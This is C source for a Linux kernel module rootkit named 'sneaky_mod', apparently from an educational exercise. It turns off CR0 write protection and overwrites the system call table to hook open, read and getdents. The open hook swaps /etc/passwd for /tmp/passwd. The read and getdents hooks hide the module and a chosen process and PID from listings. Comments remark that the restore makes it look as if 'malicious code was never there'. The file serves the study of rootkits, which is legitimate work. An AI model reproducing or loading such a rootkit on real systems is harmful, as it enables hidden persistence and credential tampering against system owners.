#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

static char* pid = "";
module_param(pid, charp, 0);

struct linux_dirent {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    char d_name[];
};

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81073190;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81073110;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
// asmlinkage int (*original_call)(const char *pathname, int flags);
asmlinkage int (*original_open)(const char *pathname, int flags);
asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,unsigned int count);

//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
  printk(KERN_INFO "Very, very Sneaky!\n");
  if (strcmp(pathname, "/etc/passwd") == 0) {
    copy_to_user((void *)pathname, "/tmp/passwd", 12);
  }
  return original_open(pathname, flags);
}


asmlinkage int sneaky_sys_read(int fd, void* buf, size_t count) {
  ssize_t nbyte = original_read(fd, buf, count);
  if(nbyte > 0) {
    void* sneaky_loc = strstr(buf, "sneaky_mod");
    if(sneaky_loc != NULL) {
      if (sneaky_loc != NULL) {
      void *end = strnstr(sneaky_loc, "\n", nbyte - (sneaky_loc - buf));
      if (end != NULL) {
          int len = end - sneaky_loc + 1;
          memmove(sneaky_loc, end + 1, nbyte - (sneaky_loc - buf) - len);
          nbyte -= len;
        }
      }
    }
  }
  return nbyte;
}

asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,unsigned int count) {
  int nbyte = original_getdents(fd, dirp, count);
  int i=0;
  for (; i < nbyte;) {
    struct linux_dirent *d = (void *)dirp + i;

    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pid) == 0) {
      int cur_size = d->d_reclen;
      int nleft = ((void *)dirp + nbyte) - ((void *)d + cur_size);
      void *next = (void *)d + cur_size;
      memmove(d, next, nleft);
      nbyte -= cur_size;
    }
    else {
      i += d->d_reclen;
    }

  }

  return nbyte;
}


//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_open = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  original_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

  original_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_open;
  *(sys_call_table + __NR_read) = (unsigned long)original_read;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

